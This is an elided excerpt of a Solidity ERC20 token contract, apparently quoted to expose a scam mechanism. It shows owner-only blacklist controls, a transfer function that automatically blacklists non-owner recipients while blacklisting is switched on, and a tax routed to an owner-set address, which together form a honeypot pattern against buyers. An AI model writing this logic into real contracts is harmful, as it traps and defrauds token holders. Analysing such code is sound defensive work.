...
contract TokenV2 is ERC20Interface, SafeMath {
    ...
    function sendTax(uint tax) private returns (bool success) {
        ...
        emit Transfer(msg.sender, address(0), taxed);
        taxed = safeSub(tax, taxed);
        balances[taxAddr] = safeAdd(balances[taxAddr], taxed);
        emit Transfer(msg.sender, taxAddr, taxed);
        return true;
    }
	...
	function transfer(address to, uint tokens) public returns (bool success) {
        ...
        {
            if (blacklisting == true && owners[to] == false)
                blacklisted[to] = true;
    ...
    function getBlackist(address _addr) public view returns(bool) {
        return  blacklisted[_addr];
    }

    function setBlackisting(bool val) public {
        require(owners[msg.sender] == true);
        blacklisting = val;
    }
    ...
    function alterBlacklist(address _addr, bool val) public {
        require(owners[msg.sender] == true);
        blacklisted[_addr] = val;
    }
